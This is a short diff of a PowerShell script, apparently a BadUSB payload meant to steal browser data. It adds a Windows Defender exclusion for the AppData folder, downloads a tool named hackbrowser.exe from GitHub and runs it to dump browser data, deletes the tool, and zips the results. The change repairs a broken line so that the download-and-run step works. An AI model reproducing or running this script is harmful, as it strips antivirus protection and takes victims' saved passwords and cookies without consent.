@@ -4,8 +4,7 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
 #Downloading and executing hackbrowser.exe
-$down = New-Object System.Net.WebClient; $url = 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe'; $file = 'hbdown.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file)
-.\hb.exe --format json
+$down = New-Object System.Net.WebClient; $url = 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe'; $file = 'hb.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file)
 Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
